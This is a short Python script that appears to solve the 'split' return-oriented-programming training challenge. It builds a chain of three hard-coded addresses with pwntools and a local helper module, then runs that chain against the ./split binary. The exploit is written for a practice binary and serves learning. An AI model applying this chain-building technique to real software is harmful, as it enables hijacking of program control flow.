#!/usr/bin/python

import sys
import pwn
import time

import util

def main():
    chain = util.chain([0x0000000000400883, 0x00601060, 0x00400810])
    print chain
    print util.runchain('./split', chain)

if __name__ == '__main__':
    main()
